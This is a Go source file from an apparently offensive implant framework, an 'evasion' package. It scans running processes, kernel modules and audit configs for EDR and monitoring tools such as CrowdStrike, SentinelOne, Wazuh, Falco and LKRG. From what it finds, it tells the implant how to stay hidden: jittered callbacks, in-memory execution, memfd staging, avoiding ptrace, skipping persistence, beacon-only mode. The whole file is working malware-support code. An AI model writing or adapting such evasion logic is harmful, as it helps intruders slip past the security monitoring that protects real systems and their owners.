package evasion

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// RiskLevel represents the assessed threat level from detected security tooling.
type RiskLevel int

const (
	RiskNone     RiskLevel = iota
	RiskLow                // Audit-only tools (auditd, osquery)
	RiskMedium             // Visibility tools with alerting (Wazuh, Elastic)
	RiskHigh               // Active EDR with response capabilities (CrowdStrike, S1)
	RiskCritical           // Multiple high-tier agents or kernel-level monitoring
)

// String returns the human-readable name of the risk level.
func (r RiskLevel) String() string {
	switch r {
	case RiskNone:
		return "NONE"
	case RiskLow:
		return "LOW"
	case RiskMedium:
		return "MEDIUM"
	case RiskHigh:
		return "HIGH"
	case RiskCritical:
		return "CRITICAL"
	default:
		return "UNKNOWN"
	}
}

// EDRAgent represents a detected security agent or monitoring tool.
type EDRAgent struct {
	Name     string    `json:"name"`
	Process  string    `json:"process"`
	Risk     RiskLevel `json:"risk"`
	Category string    `json:"category"` // "edr", "audit", "kernel", "ebpf"
}

// EDRInfo holds the results of EDR and security tooling detection.
type EDRInfo struct {
	Agents    []EDRAgent `json:"agents"`
	RiskLevel RiskLevel  `json:"risk_level"`
}

// BehaviorRecommendation describes an operational adjustment based on EDR presence.
type BehaviorRecommendation struct {
	Action      string `json:"action"`
	Description string `json:"description"`
}

// edrSignature maps process names to their EDR agent metadata.
type edrSignature struct {
	agentName string
	risk      RiskLevel
	category  string
}

// knownEDRProcesses maps process comm names to their corresponding EDR agent info.
var knownEDRProcesses = map[string]edrSignature{
	// CrowdStrike Falcon
	"falcon-sensor": {agentName: "CrowdStrike Falcon", risk: RiskHigh, category: "edr"},

	// Carbon Black
	"cbagentd": {agentName: "Carbon Black", risk: RiskHigh, category: "edr"},
	"cbdaemon": {agentName: "Carbon Black", risk: RiskHigh, category: "edr"},

	// SentinelOne
	"sentinelone-agent": {agentName: "SentinelOne", risk: RiskHigh, category: "edr"},

	// Sophos
	"sophosd":     {agentName: "Sophos", risk: RiskHigh, category: "edr"},
	"savscand":    {agentName: "Sophos", risk: RiskHigh, category: "edr"},
	"sophoslinux": {agentName: "Sophos", risk: RiskHigh, category: "edr"},

	// OSSEC / Wazuh
	"ossec-analysisd": {agentName: "OSSEC", risk: RiskMedium, category: "audit"},
	"wazuh-agent":     {agentName: "Wazuh", risk: RiskMedium, category: "audit"},
	"wazuh-agentd":    {agentName: "Wazuh", risk: RiskMedium, category: "audit"},
	"wazuh-modulesd":  {agentName: "Wazuh", risk: RiskMedium, category: "audit"},

	// osquery
	"osqueryd": {agentName: "osquery", risk: RiskLow, category: "audit"},
	"osqueryi": {agentName: "osquery", risk: RiskLow, category: "audit"},

	// Auditd
	"auditd": {agentName: "Linux Audit", risk: RiskLow, category: "audit"},

	// Falco
	"falco": {agentName: "Falco", risk: RiskMedium, category: "ebpf"},

	// Sysmon for Linux
	"sysmon": {agentName: "Sysmon for Linux", risk: RiskMedium, category: "audit"},

	// Elastic Agent / Endpoint Security
	"elastic-agent":    {agentName: "Elastic Agent", risk: RiskMedium, category: "edr"},
	"elastic-endpoint": {agentName: "Elastic Endpoint", risk: RiskHigh, category: "edr"},

	// Velociraptor
	"velociraptor": {agentName: "Velociraptor", risk: RiskMedium, category: "edr"},
}

// knownKernelModules maps kernel module names to their security tool info.
var knownKernelModules = map[string]edrSignature{
	"lkrg": {agentName: "Linux Kernel Runtime Guard", risk: RiskHigh, category: "kernel"},
	"lime": {agentName: "LiME Memory Acquisition", risk: RiskMedium, category: "kernel"},
}

// DetectEDR scans the system for known EDR agents, security monitoring tools,
// kernel modules, and audit configurations. Returns a structured summary of
// all detected agents and an overall risk assessment.
func DetectEDR() *EDRInfo {
	info := &EDRInfo{
		Agents:    make([]EDRAgent, 0),
		RiskLevel: RiskNone,
	}

	// Scan running processes.
	detectEDRProcesses(info)

	// Check for security kernel modules.
	detectKernelModules(info)

	// Check for audit rules.
	detectAuditRules(info)

	// Compute overall risk level.
	info.RiskLevel = computeRiskLevel(info.Agents)

	return info
}

// AdjustBehavior returns operational recommendations based on detected EDR tooling.
// The caller should use these to modify implant behavior at runtime.
func AdjustBehavior(info *EDRInfo) []BehaviorRecommendation {
	recs := make([]BehaviorRecommendation, 0)

	if info.RiskLevel == RiskNone {
		return recs
	}

	// Universal recommendations for any detection.
	recs = append(recs, BehaviorRecommendation{
		Action:      "increase_jitter",
		Description: "Increase callback jitter to 0.5+ to reduce pattern detection",
	})

	// Category-specific recommendations.
	hasEDR := false
	hasAudit := false
	hasKernel := false
	haseBPF := false

	for _, agent := range info.Agents {
		switch agent.Category {
		case "edr":
			hasEDR = true
		case "audit":
			hasAudit = true
		case "kernel":
			hasKernel = true
		case "ebpf":
			haseBPF = true
		}
	}

	if hasEDR {
		recs = append(recs, BehaviorRecommendation{
			Action:      "disable_shell_exec",
			Description: "Avoid direct shell execution; use in-memory execution only",
		})
		recs = append(recs, BehaviorRecommendation{
			Action:      "increase_interval",
			Description: "Increase callback interval to reduce network detection surface",
		})
		recs = append(recs, BehaviorRecommendation{
			Action:      "avoid_disk_writes",
			Description: "Minimize disk writes; use tmpfs and memfd for all staging",
		})
	}

	if hasAudit {
		recs = append(recs, BehaviorRecommendation{
			Action:      "minimize_syscalls",
			Description: "Reduce uncommon syscall usage to avoid audit rule triggers",
		})
		recs = append(recs, BehaviorRecommendation{
			Action:      "avoid_ptrace",
			Description: "Do not use ptrace-based techniques; auditd likely monitors them",
		})
	}

	if hasKernel {
		recs = append(recs, BehaviorRecommendation{
			Action:      "avoid_module_load",
			Description: "Do not attempt kernel module operations; LKRG will detect them",
		})
		recs = append(recs, BehaviorRecommendation{
			Action:      "consider_abort",
			Description: "Kernel-level monitoring detected; consider aborting operation",
		})
	}

	if haseBPF {
		recs = append(recs, BehaviorRecommendation{
			Action:      "avoid_sensitive_syscalls",
			Description: "eBPF tracing active; execve/connect/open calls may be logged",
		})
		recs = append(recs, BehaviorRecommendation{
			Action:      "use_namespace_isolation",
			Description: "Ensure full namespace isolation to limit eBPF visibility",
		})
	}

	if info.RiskLevel >= RiskHigh {
		recs = append(recs, BehaviorRecommendation{
			Action:      "disable_persistence",
			Description: "Do not install persistence mechanisms; detection risk too high",
		})
	}

	if info.RiskLevel >= RiskCritical {
		recs = append(recs, BehaviorRecommendation{
			Action:      "minimal_operation",
			Description: "Operate in minimal mode: beacon-only, no tasking execution",
		})
	}

	return recs
}

// detectEDRProcesses walks /proc to find processes matching known EDR signatures.
func detectEDRProcesses(info *EDRInfo) {
	procDir, err := os.Open("/proc")
	if err != nil {
		return
	}
	defer procDir.Close()

	entries, err := procDir.Readdirnames(-1)
	if err != nil {
		return
	}

	// Track already-detected agent names to avoid duplicates.
	seen := make(map[string]bool)

	for _, entry := range entries {
		// Only look at numeric PID directories.
		if len(entry) == 0 || entry[0] < '0' || entry[0] > '9' {
			continue
		}

		commPath := filepath.Join("/proc", entry, "comm")
		data, err := os.ReadFile(commPath)
		if err != nil {
			continue
		}

		comm := strings.TrimSpace(string(data))
		commLower := strings.ToLower(comm)

		if sig, ok := knownEDRProcesses[commLower]; ok {
			if seen[sig.agentName] {
				continue
			}
			seen[sig.agentName] = true
			info.Agents = append(info.Agents, EDRAgent{
				Name:     sig.agentName,
				Process:  comm,
				Risk:     sig.risk,
				Category: sig.category,
			})
		}
	}
}

// detectKernelModules reads /proc/modules to find loaded security kernel modules.
func detectKernelModules(info *EDRInfo) {
	f, err := os.Open("/proc/modules")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 1 {
			continue
		}

		modName := strings.ToLower(fields[0])
		if sig, ok := knownKernelModules[modName]; ok {
			info.Agents = append(info.Agents, EDRAgent{
				Name:     sig.agentName,
				Process:  fmt.Sprintf("kmod:%s", modName),
				Risk:     sig.risk,
				Category: sig.category,
			})
		}
	}
}

// detectAuditRules checks for the presence of audit rule configurations.
func detectAuditRules(info *EDRInfo) {
	auditPaths := []string{
		"/etc/audit/audit.rules",
		"/etc/audit/rules.d",
	}

	for _, p := range auditPaths {
		fi, err := os.Stat(p)
		if err != nil {
			continue
		}

		if fi.IsDir() {
			// Check if the rules directory has any .rules files.
			entries, err := os.ReadDir(p)
			if err != nil {
				continue
			}
			for _, e := range entries {
				if strings.HasSuffix(e.Name(), ".rules") {
					info.Agents = append(info.Agents, EDRAgent{
						Name:     "Audit Rules",
						Process:  fmt.Sprintf("config:%s/%s", p, e.Name()),
						Risk:     RiskLow,
						Category: "audit",
					})
					return // One entry is sufficient.
				}
			}
		} else {
			// File exists.
			if fi.Size() > 0 {
				info.Agents = append(info.Agents, EDRAgent{
					Name:     "Audit Rules",
					Process:  fmt.Sprintf("config:%s", p),
					Risk:     RiskLow,
					Category: "audit",
				})
				return
			}
		}
	}
}

// computeRiskLevel determines the overall risk based on all detected agents.
func computeRiskLevel(agents []EDRAgent) RiskLevel {
	if len(agents) == 0 {
		return RiskNone
	}

	maxRisk := RiskNone
	highCount := 0

	for _, agent := range agents {
		if agent.Risk > maxRisk {
			maxRisk = agent.Risk
		}
		if agent.Risk >= RiskHigh {
			highCount++
		}
	}

	// Multiple high-risk agents elevate to critical.
	if highCount >= 2 {
		return RiskCritical
	}

	return maxRisk
}
